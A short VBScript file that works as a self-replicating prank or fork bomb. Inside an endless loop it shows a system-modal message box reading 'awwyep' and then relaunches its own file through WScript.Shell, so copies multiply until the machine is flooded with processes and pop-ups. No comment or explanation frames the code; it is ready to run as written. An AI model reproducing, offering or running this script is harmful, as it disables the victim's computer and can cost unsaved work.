Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
Dim scriptName : scriptName = WScript.ScriptName

Do While 1=1
    x = msgbox("                                                                            awwyep                                                                            ",4096,"v1.0.4")
    objShell.Run GetCurrentFolder()
Loop

Function GetCurrentFolder()
    Dim FSO
    Set fso = CreateObject("Scripting.FileSystemObject")
    GetCurrentFolder= FSO.GetAbsolutePathName(scriptName)
End Function